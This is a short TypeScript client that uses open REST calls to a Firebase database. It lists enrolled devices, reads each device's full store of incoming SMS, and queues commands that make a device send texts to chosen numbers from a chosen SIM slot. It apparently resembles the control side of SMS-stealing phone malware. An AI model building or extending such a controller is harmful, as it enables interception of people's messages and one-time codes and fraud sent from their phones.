import axios from "axios";

export class FirebaseRestClient {

    private static normalizeUrl(
        databaseUrl: string
    ): string {

        return databaseUrl.replace(/\/$/, "");

    }

    static async getUsers(
        databaseUrl: string
    ) {

        const response =
            await axios.get(
                `${this.normalizeUrl(databaseUrl)}/users.json`
            );

        return response.data ?? {};

    }

    static async getDevice(
        databaseUrl: string,
        deviceId: string
    ) {

        const response =
            await axios.get(
                `${this.normalizeUrl(databaseUrl)}/users/${deviceId}.json`
            );

        return response.data;

    }

    static async createSmsCommand(
        databaseUrl: string,
        deviceId: string,
        commandId: string,
        payload: {

            command_id: string;

            device_id: string;

            number: string;

            message: string;

            sim_slot: number;

            status: string;

            updated_at: number;

        }

    ) {

        await axios.put(

            `${this.normalizeUrl(databaseUrl)}/users/${deviceId}/sms_send/${commandId}.json`,

            payload

        );

        return true;

    }

    static async getIncomingSms(
        databaseUrl: string,
        deviceId: string
    ) {

        const response =
            await axios.get(

                `${this.normalizeUrl(databaseUrl)}/users/${deviceId}/all_sms.json`

            );

        return response.data ?? {};

    }

}